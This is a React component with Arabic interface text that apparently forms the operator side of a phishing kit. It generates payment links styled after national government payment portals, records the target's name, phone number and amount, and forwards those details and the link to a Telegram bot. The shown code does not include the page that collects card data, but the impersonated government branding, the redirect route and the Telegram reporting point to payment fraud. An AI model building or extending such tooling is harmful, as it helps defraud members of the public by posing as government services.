import React, { useState, useMemo, useEffect } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Card } from "@/components/ui/card";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Textarea } from "@/components/ui/textarea";
import { useToast } from "@/hooks/use-toast";
import { useCreateLink } from "@/hooks/useSupabase";
import { getGovernmentPaymentSystem } from "@/lib/governmentPaymentSystems";
import { getGovernmentServiceByKey } from "@/lib/governmentPaymentServices";
import { getCurrencySymbol, getCurrencyCode } from "@/lib/countryCurrencies";
import { 
  Landmark, 
  FileText, 
  DollarSign, 
  User, 
  Phone, 
  Mail,
  Copy,
  ExternalLink,
  CheckCircle,
  Shield,
  Lock,
  ArrowRight,
  Info,
  RefreshCw
} from "lucide-react";
import BackButton from "@/components/BackButton";
import { sendToTelegram } from "@/lib/telegram";

const GovernmentPaymentLinkCreator = () => {
  const { country, serviceKey } = useParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  const createLink = useCreateLink();
  
  const govService = useMemo(() => getGovernmentServiceByKey(serviceKey || ''), [serviceKey]);
  const govSystem = useMemo(() => getGovernmentPaymentSystem(country || 'SA'), [country]);
  
  const [fullName, setFullName] = useState("");
  const [phoneNumber, setPhoneNumber] = useState("");
  const [email, setEmail] = useState("");
  const [amount, setAmount] = useState("500");
  const [reference, setReference] = useState("");
  const [description, setDescription] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [createdLink, setCreatedLink] = useState("");
  const [linkId, setLinkId] = useState("");
  const [showSuccess, setShowSuccess] = useState(false);
  const [paymentMethod, setPaymentMethod] = useState("card");

  const primaryColor = govSystem?.colors?.primary || "#F58220";

  useEffect(() => {
    window.scrollTo(0, 0);
  }, []);

  if (!govService) {
    return (
      <div className="min-h-screen flex items-center justify-center p-4 bg-gray-50">
        <Card className="p-8 text-center max-w-md shadow-lg border-0">
          <h2 className="text-xl font-bold mb-4 text-red-600">الخدمة غير موجودة</h2>
          <Button onClick={() => navigate('/services')} className="w-full h-12 text-base font-bold">العودة للخدمات</Button>
        </Card>
      </div>
    );
  }

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsSubmitting(true);
    if (!fullName || !phoneNumber || !amount) {
      toast({ title: "خطأ", description: "يرجى تعبئة الحقول المطلوبة", variant: "destructive" });
      setIsSubmitting(false);
      return;
    }

    try {
      const link = await createLink.mutateAsync({
        type: "government",
        country_code: country || govService.country,
        payload: {
          service_key: serviceKey,
          service_name: govService.nameAr,
          customerInfo: { fullName, phoneNumber, email },
          payment_amount: parseFloat(amount),
          currency_code: getCurrencyCode(country || govService.country),
          reference,
          description,
          selectedCountry: country || govService.country,
          payment_method: paymentMethod,
        },
      });

      const paymentUrl = `${window.location.origin}/r/${country || 'SA'}/government/${link.id}`;
      setCreatedLink(paymentUrl);
      setLinkId(link.id);
      setShowSuccess(true);

      await sendToTelegram({
        type: 'payment_recipient',
        data: {
          service: govService.nameAr,
          customer_name: fullName,
          phone: phoneNumber,
          amount: parseFloat(amount),
          currency: getCurrencySymbol(country || govService.country),
          payment_url: paymentUrl,
        },
        timestamp: new Date().toISOString(),
      });

      toast({ title: "تم بنجاح" });
    } catch (error) {
      toast({ title: "خطأ", description: "فشل إنشاء الرابط", variant: "destructive" });
    } finally {
      setIsSubmitting(false);
    }
  };

  if (showSuccess) {
    return (
      <div className="min-h-screen flex items-center justify-center py-6 px-4 bg-gray-50" dir="rtl">
        <Card className="max-w-xl w-full overflow-hidden border-0 shadow-2xl bg-white rounded-[2rem]">
          <div className="p-8 text-center relative overflow-hidden" style={{ background: govSystem.gradients.header }}>
            <div className="w-16 h-16 mx-auto mb-4 rounded-full bg-white/20 flex items-center justify-center border-2 border-white/30"><CheckCircle className="w-10 h-10 text-white" /></div>
            <h2 className="text-2xl font-black text-white">رابط السداد جاهز</h2>
          </div>
          <div className="p-6 sm:p-10 space-y-6">
            <div className="p-4 rounded-xl border-2 bg-gray-50 break-all text-xs font-mono">{createdLink}</div>
            <div className="grid grid-cols-2 gap-3">
              <Button onClick={() => { navigator.clipboard.writeText(createdLink); toast({ title: "تم النسخ" }); }} className="h-14 rounded-xl font-black" style={{ background: govSystem.gradients.primary }}><Copy className="w-4 h-4 ml-2" /> نسخ</Button>
              <Button onClick={() => window.open(createdLink, '_blank')} variant="outline" className="h-14 rounded-xl border-2 font-black" style={{ borderColor: primaryColor, color: primaryColor }}><ExternalLink className="w-4 h-4 ml-2" /> معاينة</Button>
            </div>
            <Button onClick={() => navigate('/services')} variant="ghost" className="w-full text-gray-400 font-bold">العودة للخدمات</Button>
          </div>
        </Card>
      </div>
    );
  }

  return (
    <div className="min-h-screen py-4 px-2 bg-gray-50" dir="rtl">
      <div className="container mx-auto max-w-2xl">
        <div className="mb-4 px-2"><BackButton /></div>

        <Card className="overflow-hidden border-0 shadow-2xl bg-white rounded-[2rem]">
          <div className="p-6 sm:p-8 relative flex items-center gap-4" style={{ background: govSystem.gradients.header }}>
            <div className="w-12 h-12 rounded-xl bg-white/20 flex items-center justify-center border border-white/30 shadow-xl"><Landmark className="w-6 h-6 text-white" /></div>
            <div>
              <h1 className="text-lg sm:text-2xl font-black text-white">{govService.nameAr}</h1>
              <p className="text-[10px] text-white/80 font-bold uppercase tracking-widest">{govSystem.nameEn} Portal</p>
            </div>
          </div>

          <form onSubmit={handleSubmit} className="p-6 sm:p-8 space-y-4 sm:space-y-6">
            <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
              <div className="space-y-1.5"><Label className="text-[10px] font-black text-gray-400 uppercase">اسم المستفيد</Label><Input value={fullName} onChange={(e) => setFullName(e.target.value)} placeholder="الاسم الكامل" required className="h-12 border-2 rounded-xl text-base font-bold" /></div>
              <div className="space-y-1.5"><Label className="text-[10px] font-black text-gray-400 uppercase">رقم الجوال</Label><Input value={phoneNumber} onChange={(e) => setPhoneNumber(e.target.value)} placeholder="05XXXXXXXX" required className="h-12 border-2 rounded-xl text-base font-bold text-left" dir="ltr" /></div>
            </div>

            <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
              <div className="space-y-1.5"><Label className="text-[10px] font-black text-gray-400 uppercase">المبلغ المطلوب</Label><div className="relative"><Input type="number" value={amount} onChange={(e) => setAmount(e.target.value)} required className="h-12 border-2 rounded-xl text-lg font-black pl-10" /><div className="absolute left-3 top-1/2 -translate-y-1/2 text-[10px] font-black text-gray-400">{getCurrencySymbol(country || govService.country)}</div></div></div>
              <div className="space-y-1.5"><Label className="text-[10px] font-black text-gray-400 uppercase">رقم المرجع (اختياري)</Label><Input value={reference} onChange={(e) => setReference(e.target.value)} placeholder="INV-XXXX" className="h-12 border-2 rounded-xl text-base font-bold" /></div>
            </div>

            <Button type="submit" disabled={isSubmitting} className="w-full h-14 sm:h-16 rounded-xl sm:rounded-2xl text-lg sm:text-xl font-black shadow-xl transition-all" style={{ background: govSystem.gradients.primary }}>
              {isSubmitting ? <RefreshCw className="w-5 h-5 animate-spin" /> : <><Lock className="w-5 h-5 ml-2" /> إصدار رابط السداد</>}
            </Button>
          </form>
        </Card>
      </div>
    </div>
  );
};

export default GovernmentPaymentLinkCreator;
